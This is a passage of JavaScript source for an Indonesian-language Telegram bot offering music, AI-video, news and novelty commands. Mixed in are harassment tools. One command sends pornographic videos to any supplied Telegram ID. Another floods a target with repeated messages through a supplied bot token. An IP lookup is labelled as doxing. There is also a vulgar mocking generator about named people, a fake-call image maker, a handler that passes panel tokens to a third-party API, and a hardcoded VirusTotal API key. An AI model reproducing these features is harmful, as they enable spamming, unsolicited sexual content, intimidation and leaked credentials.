    const videoUrl = pickRandomVideo();

    // Kirim langsung ke target Telegram
    await bot.sendVideo(targetId, videoUrl, {
      caption: "📹 Nih videonya bre...",
    });

    await bot.editMessageText(
      `✅ *Terkirim sukses ke:* \`${targetId}\``,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );

  } catch (err) {
    await bot.editMessageText(
      `❌ *Gagal mengirim:* ${err.message}`,
      {
        chat_id: chatId,
        message_id: waitingMsg.message_id,
        parse_mode: "Markdown",
      }
    );
  }
});

// Jika format salah
bot.onText(/\/sendbokep$/, (msg) => {
  bot.sendMessage(msg.chat.id, "Format benar:\n/sendbokep <id_telegram>");
});

bot.onText(/^\/spotifysearch (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  try {
    await bot.sendMessage(chatId, "🔎 Nyari lagu di Spotify... tunggu bentar bre 🎧");

    const api = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const { data } = await axios.get(api);

    if (!data.success || !data.result || !data.result.length) {
      return bot.sendMessage(chatId, "❌ Gagal nemuin lagu di Spotify bre!");
    }

    let caption = "🎶 *Hasil Pencarian Spotify:*\n\n";

    data.result.slice(0, 10).forEach((item, i) => {
      caption += `*${i + 1}. ${item.title}*\n`;
      caption += `👤 ${item.artist}\n`;
      caption += `🕒 ${item.duration}\n`;
      caption += `🔗 [Buka Spotify](${item.url})\n\n`;
    });

    // Kirim cover + caption
    bot.sendPhoto(chatId, data.result[0].cover, {
      caption,
      parse_mode: "Markdown",
    });

  } catch (err) {
    console.error("Spotify Search Error:", err.message);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat mencari lagu di Spotify bre.");
  }
});

bot.onText(/^\/(trackipcyber|doxipcyber)(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const command = match[1];
  const ip = match[2]?.trim(); // bisa kosong

  try {
    // kalau ip kosong, ambil IP publik si user
    const targetIP = ip || (await axios.get("https://api.ipify.org?format=json")).data.ip;

    await bot.sendMessage(chatId, `🌍 Mengecek informasi IP *${targetIP}*...`, {
      parse_mode: "Markdown",
    });

    // Ambil data IP dari ipwho.is
    const { data: res } = await axios.get(`https://ipwho.is/${targetIP}`);

    if (!res.success) {
      return bot.sendMessage(chatId, `❌ Gagal menemukan informasi untuk IP *${targetIP}*`, {
        parse_mode: "Markdown",
      });
    }

    // Format hasil
    const info = `
*📡 Informasi IP*
• IP: ${res.ip || "N/A"}
• Type: ${res.type || "N/A"}
• Country: ${res.country || "N/A"} ${res.flag?.emoji || ""}
• Region: ${res.region || "N/A"}
• City: ${res.city || "N/A"}
• Latitude: ${res.latitude || "N/A"}
• Longitude: ${res.longitude || "N/A"}
• ISP: ${res.connection?.isp || "N/A"}
• Org: ${res.connection?.org || "N/A"}
• Domain: ${res.connection?.domain || "N/A"}
• Timezone: ${res.timezone?.id || "N/A"}
• Local Time: ${res.timezone?.current_time || "N/A"}
`;

    if (res.latitude && res.longitude) {
      await bot.sendLocation(chatId, res.latitude, res.longitude);
    }

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("TrackIP Error:", err);
    bot.sendMessage(chatId, `❌ Error: Tidak dapat mengambil data IP.`, {
      parse_mode: "Markdown",
    });
  }
});

// /veo3 prompt (HARUS reply foto)
bot.onText(/^\/Ai(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const prompt = match[1]?.trim();
  const reply = msg.reply_to_message;

  try {
    // Validasi reply foto
    if (!reply || !reply.photo) {
      return bot.sendMessage(chatId, `⚠️ Reply foto lalu kirim:\n/veo3 "prompt"`);
    }

    if (!prompt) {
      return bot.sendMessage(chatId, "⚠️ Tambahkan prompt untuk video!");
    }

    await fs.ensureDir("./temp");

    // Ambil foto resolusi tertinggi
    const photo = reply.photo[reply.photo.length - 1];
    const file = await bot.getFile(photo.file_id);

    const tokenToUse = bot.token || process.env.TELEGRAM_TOKEN;
    if (!tokenToUse) {
      return bot.sendMessage(chatId, "❌ Token bot tidak ditemukan.");
    }

    const fileUrl = `https://api.telegram.org/file/bot${tokenToUse}/${file.file_path}`;

    const tempPath = path.join(
      "./temp",
      `${Date.now()}_${path.basename(file.file_path)}`
    );

    // Download foto
    const writer = fs.createWriteStream(tempPath);
    const response = await axios.get(fileUrl, { responseType: "stream" });
    response.data.pipe(writer);

    await new Promise((resolve, reject) => {
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Upload ke tmpfiles (WAJIB pakai form-data dari npm)
    const formData = new FormData();
    formData.append("file", fs.createReadStream(tempPath));

    const upload = await axios.post(
      "https://tmpfiles.org/api/v1/upload",
      formData,
      { headers: formData.getHeaders() }
    );

    await fs.unlink(tempPath);

    const imageUrl = upload.data.data.url.replace(
      "tmpfiles.org/",
      "tmpfiles.org/dl/"
    );

    const loading = await bot.sendMessage(
      chatId,
      "⏳ Sedang membuat video dari image..."
    );

    // Payload API
    const payload = {
      videoPrompt: prompt,
      videoAspectRatio: "16:9",
      videoDuration: 5,
      videoQuality: "540p",
      videoModel: "v4.5",
      videoImageUrl: imageUrl,
      videoPublic: false,
    };

    // Generate task
    let taskId;
    try {
      const gen = await axios.post(
        "https://veo31ai.io/api/pixverse-token/gen",
        payload,
        { headers: { "Content-Type": "application/json" } }
      );
      taskId = gen.data.taskId;
    } catch (err) {
      console.log(`${STEMPEL}`, "GEN ERROR RAW:", err.response?.data || err);
      return bot.editMessageText(
        `❌ Error dari server:\n<code>${JSON.stringify(
          err.response?.data || err,
          null,
          2
        )}</code>`,
        { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" }
      );
    }

    if (!taskId) {
      return bot.editMessageText(
        "❌ Gagal membuat task video (taskId kosong)",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    // Tunggu video selesai
    let videoUrl;
    const timeout = Date.now() + 180000;

    while (Date.now() < timeout) {
      const res = await axios.post(
        "https://veo31ai.io/api/pixverse-token/get",
        {
          taskId,
          videoPublic: false,
          videoQuality: "540p",
          videoAspectRatio: "16:9",
          videoPrompt: prompt,
        }
      );

      if (res.data?.videoData?.url) {
        videoUrl = res.data.videoData.url;
        break;
      }

      await new Promise((r) => setTimeout(r, 5000));
    }

    if (!videoUrl) {
      return bot.editMessageText(
        "❌ Video belum tersedia atau gagal dibuat.",
        { chat_id: chatId, message_id: loading.message_id }
      );
    }

    await bot.editMessageText(
      `✅ Video berhasil dibuat!\n📎 ${videoUrl}`,
      { chat_id: chatId, message_id: loading.message_id }
    );
  } catch (err) {
    console.log(`${STEMPEL}`, "GLOBAL ERROR RAW:", err.response?.data || err);

    bot.sendMessage(
      chatId,
      `❌ Error:\n<code>${JSON.stringify(
        err.response?.data || err.message,
        null,
        2
      )}</code>`,
      { parse_mode: "HTML" }
    );
  }
});

bot.onText(/^\/getsession$/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    await bot.sendMessage(chatId, "⏳ Mengambil session...");

    const { data } = await axios.get("https://joocode.zone.id/api/getsession", {
      params: {
        domain: config.DOMAIN,
        plta: config.PLTA_TOKEN,
        pltc: config.PLTC_TOKEN,
      },
    });

    const tmpPath = path.join(process.cwd(), "Session.json");
    fs.writeFileSync(tmpPath, JSON.stringify(data, null, 2), "utf-8");

    await bot.sendDocument(chatId, tmpPath, {
      caption: "📦 Session file requested",
    });

    fs.unlinkSync(tmpPath); // hapus file setelah dikirim

  } catch (err) {
    console.error("GetSession Error:", err.message);
    bot.sendMessage(chatId, `❌ Gagal mengambil session.\n${err.message}`);
  }
});

bot.onText(/^\/gpt(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = (match[1] || "").trim();

  if (!query) {
    return bot.sendMessage(
      chatId,
      "⚠️ Contoh:\n/gpt apa itu gravitasi?"
    );
  }

  // pesan loading
  await bot.sendMessage(chatId, "⏳ Tunggu sebentar, lagi mikir...");

  try {
    const { data } = await axios.get("https://www.abella.icu/gpt-3.5", {
      params: { q: query },
      timeout: 30000,
    });

    const answer = data?.data?.answer;

    if (answer) {
      return bot.sendMessage(
        chatId,
        "```\n" + answer + "\n```",
        { parse_mode: "Markdown" }
      );
    } else {
      return bot.sendMessage(chatId, "⚠️ Tidak ada respons valid dari AI.");
    }

  } catch (err) {
    console.error("GPT Error:", err);
    bot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

bot.onText(/^\/play (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const query = match[1];

  if (!query) return bot.sendMessage(chatId, "⚠️ Contoh: /play snowchild");

  try {
    const wait = await bot.sendMessage(chatId, "🎧 Nyari lagunya bre...");

    // Search Spotify
    const searchApi = `https://api.nekolabs.my.id/discovery/spotify/search?q=${encodeURIComponent(query)}`;
    const res = await axios.get(searchApi);

    if (!res.data.success || !res.data.result?.length) {
      return bot.editMessageText("❌ Lagu tidak ditemukan bre!", {
        chat_id: chatId,
        message_id: wait.message_id,
      });
    }

    const top = res.data.result[0];

    // ambil mp3 dari spotify v2
    const dl = await axios.get(
      `https://api.siputzx.my.id/api/d/spotifyv2?url=${encodeURIComponent(top.url)}`
    );

    const mp3 = dl.data?.data?.mp3DownloadLink;
    if (!mp3) throw new Error("Gagal ambil link mp3 bre!");

    // download buffer
    const buffer = await axios
      .get(mp3, { responseType: "arraybuffer" })
      .then((r) => Buffer.from(r.data));

    await bot.sendAudio(chatId, buffer, {
      title: top.title || "Unknown",
      performer: top.artist || "Unknown",
    });

    bot.deleteMessage(chatId, wait.message_id).catch(() => {});

  } catch (e) {
    bot.sendMessage(chatId, "❌ Error: " + e.message);
  }
});

bot.onText(/^\/bratvid(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = (match[1] || "").trim();

  if (!text) {
    return bot.sendMessage(chatId, "⚠️ Contoh:\n/bratvid woi kontol");
  }

  bot.sendMessage(chatId, "🎬 Lagi bikin sticker videonya bre...");

  try {
    const res = await fetch(`https://api.zenzxz.my.id/maker/bratvid?text=${encodeURIComponent(text)}`);
    if (!res.ok) throw new Error(`HTTP error ${res.status}`);

    const buffer = Buffer.from(await res.arrayBuffer()); // ✅ FIX disini

    const tmpFile = path.join(__dirname, `bratvid_${Date.now()}.webm`);
    fs.writeFileSync(tmpFile, buffer);

    await bot.sendSticker(chatId, tmpFile);

    fs.unlinkSync(tmpFile);
  } catch (e) {
    console.error(e);
    bot.sendMessage(chatId, "❌ Gagal generate sticker video.");
  }
});

bot.onText(/^\/hd$/, async (msg) => {
  const chatId = msg.chat.id;

  // HARUS reply foto
  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply foto dulu baru ketik /hd cok."
    );
  }

  try {
    await bot.sendMessage(chatId, "⏳ Lagi ng-HD foto lu bre...");

    // Ambil foto resolusi tertinggi
    const photo = msg.reply_to_message.photo.pop();
    const file = await bot.getFile(photo.file_id);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto dari Telegram
    const dl = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const buffer = Buffer.from(dl.data);

    // Upload ke tmpfiles
    const FormData = require("form-data");
    const form = new FormData();
    form.append("file", buffer, "image.jpg");

    const upload = await axios.post("https://tmpfiles.org/api/v1/upload", form, {
      headers: form.getHeaders(),
    });

    const link = upload.data.data.url.replace("tmpfiles.org/", "tmpfiles.org/dl/");

    // API HD
    const hd = await axios.get(
      `https://api.nekolabs.web.id/tools/pxpic/restore?imageUrl=${encodeURIComponent(link)}`
    );

    if (!hd.data.success) {
      throw new Error("Gagal HD cok.");
    }

    const result = hd.data.result;

    // Kirim hasil HD
    await bot.sendPhoto(chatId, result, {
      caption: `✅ Foto berhasil di-HD cok!\n${result}`,
      parse_mode: "HTML",
    });

  } catch (err) {
    console.error("HD ERROR:", err);
    bot.sendMessage(chatId, "❌ Error cok, fotonya ga bisa di-HD.");
  }
});

bot.onText(/\/fixcode/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;

  try {
    // Cek apakah user reply ke file .js
    if (!replyMsg || !replyMsg.document) {
      return bot.sendMessage(chatId, "📂 Kirim file .js dan *reply* dengan perintah /fixcode", {
        parse_mode: "Markdown",
      });
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".js")) {
      return bot.sendMessage(chatId, "⚠️ File harus berformat .js bre!");
    }

    // Ambil file link
    const fileLink = await bot.getFileLink(file.file_id);
    await bot.sendMessage(chatId, "🤖 Lagi memperbaiki kodenya bre... tunggu bentar!");

    // Download isi file
    const response = await axios.get(fileLink, { responseType: "arraybuffer" });
    const fileContent = Buffer.from(response.data).toString("utf-8");

    // Kirim ke API NekoLabs
    const { data } = await axios.get("https://api.nekolabs.web.id/ai/gpt/4.1", {
      params: {
        text: fileContent,
        systemPrompt: `Kamu adalah seorang programmer ahli JavaScript dan Node.js.
Tugasmu adalah memperbaiki kode yang diberikan agar bisa dijalankan tanpa error, 
namun jangan mengubah struktur, logika, urutan, atau gaya penulisan aslinya.

Fokus pada:
- Menyelesaikan error sintaks (kurung, kurawal, tanda kutip, koma, dll)
- Menjaga fungsi dan struktur kode tetap sama seperti input
- Jangan menghapus komentar, console.log, atau variabel apapun
- Jika ada blok terbuka (seperti if, else, try, atau fungsi), tutup dengan benar
- Jangan ubah nama fungsi, variabel, atau struktur perintah
- Jangan tambahkan penjelasan apapun di luar kode
- Jangan tambahkan markdown javascript Karena file sudah berbentuk file .js
- Hasil akhir harus langsung berupa kode yang siap dijalankan
`,
        sessionId: "neko"
      },
      timeout: 60000,
    });

    if (!data.success || !data.result) {
      return bot.sendMessage(chatId, "❌ Gagal memperbaiki kode, coba ulang bre.");
    }

    const fixedCode = data.result;
    const outputPath = `./fixed_${file.file_name}`;
    fs.writeFileSync(outputPath, fixedCode);

    await bot.sendDocument(chatId, outputPath, {}, {
      filename: `fixed_${file.file_name}`,
      contentType: "text/javascript",
    });
  } catch (err) {
    console.error("FixCode Error:", err);
    bot.sendMessage(chatId, "⚠️ Terjadi kesalahan waktu memperbaiki kode bre.");
  }
});

bot.onText(/^\/?fakecall(?:@[\w_]+)?\s*(.*)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const args = match[1].split("|");

  if (!msg.reply_to_message || !msg.reply_to_message.photo) {
    return bot.sendMessage(chatId, "❌ Reply ke foto untuk dijadikan avatar!");
  }

  const nama = args[0]?.trim();
  const durasi = args[1]?.trim();

  if (!nama || !durasi) {
    return bot.sendMessage(chatId, "📌 Format: `/fakecall nama|durasi` (reply foto)", { parse_mode: "Markdown" });
  }

  try {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const fileLink = await bot.getFileLink(fileId);

    const api = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(
      nama
    )}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(
      fileLink
    )}`;

    const res = await fetch(api);
    const buffer = await res.buffer();

    await bot.sendPhoto(chatId, buffer, {
      caption: `📞 Fake Call dari *${nama}* (durasi: ${durasi})`,
      parse_mode: "Markdown",
    });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Gagal membuat fakecall.");
  }
});

bot.onText(/^\/cekkontol(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kontol nya');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Kontol ${text}* 」°
┃
┊• Nama : ${text}
┃• Kontol : ${pickRandom(['ih item','Belang wkwk','Muluss','Putih Mulus','Black Doff','Pink wow','Item Glossy'])}
┊• True : ${pickRandom(['perjaka','ga perjaka','udah pernah dimasukin','masih ori','jumbo'])}
┃• jembut : ${pickRandom(['lebat','ada sedikit','gada jembut','tipis','muluss'])}
┃• ukuran : ${pickRandom(['1cm','2cm','3cm','4cm','5cm','20cm','45cm','50cm','90meter','150meter','5km','gak normal'])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

bot.onText(/\/ig(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide an Instagram post/reel URL.\n\nExample:\n/ig https://www.instagram.com/reel/xxxxxx/");
    }

    const url = match[1].trim();

    try {
        const apiUrl = `https://api.nvidiabotz.xyz/download/instagram?url=${encodeURIComponent(url)}`;

        const res = await fetch(apiUrl);
        const data = await res.json();

        if (!data || !data.result) {
            return bot.sendMessage(chatId, "❌ Failed to fetch Instagram media. Please check the URL.");
        }

        // Jika ada video
        if (data.result.video) {
            await bot.sendVideo(chatId, data.result.video, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        // Jika hanya gambar
        else if (data.result.image) {
            await bot.sendPhoto(chatId, data.result.image, {
                caption: `📸 Instagram Media\n\n👤 Author: ${data.result.username || "-"}`
            });
        } 
        else {
            bot.sendMessage(chatId, "❌ Unsupported media type from Instagram.");
        }
    } catch (err) {
        console.error("Instagram API Error:", err);
        bot.sendMessage(chatId, "❌ Error fetching Instagram media. Please try again later.");
    }
});

bot.onText(/^\/rasukbot(?: (.+))?/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = (match[1] || "").trim();
  const reply = msg.reply_to_message;

  // Jika user hanya mengetik /rasukbot tanpa apapun
  if (!input) {
    return bot.sendMessage(chatId,
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>",
      { parse_mode: "HTML" }
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // Jika user membalas pesan seseorang
    if (reply) {
      const parts = input.split("|").map(x => x.trim());
      if (parts.length < 3) {
        return bot.sendMessage(chatId,
          "❌ Format salah!\nGunakan: <code>/rasukbot token|pesan|jumlah</code> (balas pesan target)",
          { parse_mode: "HTML" }
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // Format manual tanpa reply
      if (!input.includes("|")) {
        return bot.sendMessage(chatId,
          "📩 Format salah!\n\nGunakan format:\n" +
          "<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
          "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>",
          { parse_mode: "HTML" }
        );
      }

      const parts = input.split("|").map(x => x.trim());
      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return bot.sendMessage(chatId,
        "❌ Format salah!\nGunakan: <code>/rasukbot token|id|pesan|jumlah</code>",
        { parse_mode: "HTML" }
      );
    }

    await bot.sendMessage(chatId, "🚀 Mengirim pesan...");

    for (let i = 1; i <= jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    bot.sendMessage(chatId, `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    bot.sendMessage(chatId, `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`, {
      parse_mode: "HTML"
    });
  }
});

bot.onText(/^\/cekcantik(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kecantikan nya 💅');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Cek Cantik ${text}* 」°
┃
┊• Nama : ${text}
┊• Tingkat Kecantikan : ${pickRandom([
    '100% Cantik Banget 😍',
    '95% Cantik Natural 💖',
    '80% Manis Banget 😚',
    '60% Lumayan Cantik 😊',
    '40% Cantik Dalam Gelap 😂',
    '10% Butuh Filter Instagram 🤭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Kayak Bintang 🌟',
    'Menawan Banget 💫',
    'Biasa Tapi Nyenengin 💐',
    'Misterius dan Elegan 👑',
    'Lembut dan Anggun 🌸'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Senyumnya bikin leleh 😍',
    'Tatapan matanya adem banget 👁️',
    'Ramah dan manis 🍬',
    'Bikin orang jatuh cinta 💘',
    'Punya vibe princess 👑'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

bot.onText(/^\/cekganteng(?: (.+))?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const text = match[1];

  if (!text) {
    return bot.sendMessage(chatId, 'Nama nya mana yang mau di cek kegantengan nya 😎');
  }

  function pickRandom(list) {
    return list[Math.floor(Math.random() * list.length)];
  }

  const hasil = `
╭━━━━°「 *Cek Ganteng ${text}* 」°
┃
┊• Nama : ${text}
┊• Tingkat Kegantengan : ${pickRandom([
    '100% Ganteng Parah 😎',
    '90% Ganteng Natural 😁',
    '75% Lumayan Ganteng 😌',
    '50% Standar Pasar Minggu 😅',
    '25% Masih Proses Pubertas 😂',
    '0% Gagal Upgrade 😭'
  ])}
┃• Aura : ${pickRandom([
    'Bersinar Terang ✨',
    'Biasa Aja 😶',
    'Kayak Lampu Redup 💡',
    'Misterius 😏',
    'Menyilaukan 🔥'
  ])}
┊• Nilai Tambah : ${pickRandom([
    'Punya senyum manis 😁',
    'Tatapan mematikan 😎',
    'Berwibawa banget 🧠',
    'Lucu dan menggemaskan 🐣',
    'Mirip artis katanya 🎬'
  ])}
╰═┅═━––––––๑`;

  bot.sendMessage(chatId, hasil);
});

bot.onText(/^\/beritaindo$/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📰 Sedang mengambil berita terbaru Indonesia...");

  try {
    // RSS Google News Indonesia
    const url = "https://news.google.com/rss?hl=id&gl=ID&ceid=ID:id";
    const res = await fetch(url);
    const xml = await res.text();

    // Ambil judul dan link berita (pakai regex biar ringan)
    const titles = [...xml.matchAll(/<title>(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?<\/title>/g)].map((m) => m[1]);
    const links = [...xml.matchAll(/<link>(.*?)<\/link>/g)].map((m) => m[1]);

    // Lewati item pertama (judul feed)
    const items = titles.slice(1, 6).map((t, i) => ({
      title: t,
      link: links[i + 1] || "",
    }));

    // Format teks berita
    const beritaText = items
      .map((item, i) => `${i + 1}. [${item.title}](${item.link})`)
      .join("\n\n");

    await bot.sendMessage(
      chatId,
      `🇮🇩 *Berita Indonesia Terbaru*\n\n${beritaText}\n\nSumber: ©Jarzx`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );
  } catch (error) {
    console.error("❌ Error beritaindo:", error);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil berita. Coba lagi nanti.");
  }
});

bot.onText(/^\/negarainfo(?: (.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const negara = match[1]?.trim();

  if (!negara) {
    return bot.sendMessage(chatId, "🌍 Ketik nama negara!\nContoh: `/negarainfo jepang`", { parse_mode: "Markdown" });
  }

  try {
    const res = await fetch(`https://restcountries.com/v3.1/name/${encodeURIComponent(negara)}?fullText=false`);
    const data = await res.json();

    if (!Array.isArray(data) || !data.length) {
      return bot.sendMessage(chatId, "⚠️ Negara tidak ditemukan. Coba ketik nama lain.");
    }

    const n = data[0];
    const name = n.translations?.id?.common || n.name.common;
    const capital = n.capital ? n.capital[0] : "Tidak ada data";
    const region = n.region || "Tidak ada data";
    const subregion = n.subregion || "-";
    const population = n.population?.toLocaleString("id-ID") || "-";
    const currency = n.currencies ? Object.values(n.currencies)[0].name : "-";
    const symbol = n.currencies ? Object.values(n.currencies)[0].symbol : "";
    const flag = n.flag || "🏳️";

    const info = `
${flag} *${name}*

🏙️ Ibukota: ${capital}
🌍 Wilayah: ${region} (${subregion})
👨‍👩‍👧‍👦 Populasi: ${population}
💰 Mata uang: ${currency} ${symbol}
📍 Kode negara: ${n.cca2 || "-"}
`;

    bot.sendMessage(chatId, info, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("❌ Error negara info:", err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil data negara. Coba lagi nanti.");
  }
});

bot.onText(/^\/ssweb (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const text = match[1];

    if (!text || !text.trim()) {
        return bot.sendMessage(chatId, "Contoh:\n/ssweb google.com");
    }

    try {
        bot.sendChatAction(chatId, "upload_photo").catch(() => {});

        let cleanUrl = text.replace(/^https?:\/\//, "").trim();
        let finalUrl = "https://" + cleanUrl;

        let ssImage = "https://image.thum.io/get/width/1900/crop/1000/fullpage/" + finalUrl;

        await bot.sendPhoto(chatId, ssImage, {
            caption: "_berhasil ssweb_",
            parse_mode: "Markdown"
        });

    } catch (e) {
        console.log(`${STEMPEL}`, "SSWEB ERROR:", e);
        bot.sendMessage(chatId, "⚠️ Server SS Web sedang offline atau URL tidak valid.");
    }
}); 

bot.onText(/\/cekroblox (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const username = match[1];

  if (!username) {
    return bot.sendMessage(chatId, '<blockquote>❌ ᴘʟᴇᴀsᴇ ᴘʀᴏᴠɪᴅᴇ ᴀ ʀᴏʙʟᴏx ᴜsᴇʀɴᴀᴍᴇ</blockquote>', { parse_mode: 'HTML' });
  }

  const loading = await bot.sendMessage(chatId, "🔍 <i>Mencari data Roblox...</i>", { parse_mode: "HTML" });

  try {
    const response = await axios.get(`https://piereeapi.vercel.app/stalk/roblox?user=${encodeURIComponent(username)}`);

    if (!response.data.status) {
      return bot.editMessageText('<blockquote>❌ ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ</blockquote>', {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML"
      });
    }

    const info = response.data.data;

    const caption = `
<blockquote>🕵️ Roblox Stalker Result</blockquote>

<b>👤 Username:</b> ${info.basic.name}
<b>🆔 User ID:</b> ${info.basic.id}
<b>✨ Display:</b> ${info.basic.displayName}
<b>📅 Created:</b> ${info.basic.created}
<b>⛔ Banned:</b> ${info.basic.isBanned}

<b>👥 Friends:</b> ${info.social.friends.count}
<b>👤 Followers:</b> ${info.social.followers.count}
<b>➡️ Following:</b> ${info.social.following.count}
    `;

    const avatar = info.avatar.data[0]?.imageUrl;

    if (!avatar) {
      return bot.editMessageText('<blockquote>❌ Avatar tidak tersedia</blockquote>', {
        chat_id: chatId,
        message_id: loading.message_id,
        parse_mode: "HTML"
      });
    }

    await bot.editMessageText("✅ <i>Data ditemukan, mengirim avatar...</i>", {
      chat_id: chatId,
      message_id: loading.message_id,
      parse_mode: "HTML"
    });

    await bot.sendPhoto(chatId, avatar, {
      caption: caption,
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error(error);
    bot.editMessageText('<blockquote>❌ ᴇʀʀᴏʀ ꜰᴇᴛᴄʜɪɴɢ ᴅᴀᴛᴀ</blockquote>', {
      chat_id: chatId,
      message_id: loading.message_id,
      parse_mode: "HTML"
    });
  }
});

bot.onText(/\/getcode (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
   const senderId = msg.from.id;
   const randomImage = getRandomImage();
    const userId = msg.from.id;
            //cek prem //
if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `
<blockquote>#Base ⵢ Jarzx  ⚘</blockquote>
Oi kontol kalo mau akses comandd ini,
/addprem dulu bego 
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "X - DEVLOVER", url: "https://t.me/JarzxNotDev" }], 
      ]
    }
  });
}
  const url = (match[1] || "").trim();
  if (!/^https?:\/\//i.test(url)) {
    return bot.sendMessage(chatId, "♥️ /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ CODE DARI ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "♥️🥹 ERROR SAAT MENGAMBIL CODE WEB");
  }
});

bot.onText(/\/sticker/, async (msg) => {
  const chatId = msg.chat.id;
  await bot.sendMessage(chatId, "📸 Kirimkan foto atau gambar yang ingin dijadikan stiker!");

  bot.once('photo', async (photoMsg) => {
    try {
      const fileId = photoMsg.photo[photoMsg.photo.length - 1].file_id;
      const fileLink = await bot.getFileLink(fileId);
      const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
      const filePath = `sticker_${chatId}.jpg`;

      fs.writeFileSync(filePath, response.data);
      await bot.sendSticker(chatId, filePath);
      fs.unlinkSync(filePath);
    } catch (err) {
      await bot.sendMessage(chatId, "❌ Terjadi kesalahan saat membuat stiker.");
    }
  });
});

const VTOTAL_APIKEY = "a0a250caa94ac58ed0dbac7100c17ba8f7074193ae6a92833431f6d616c60021";
const cooldown = new Map(); // Anti-SPAM

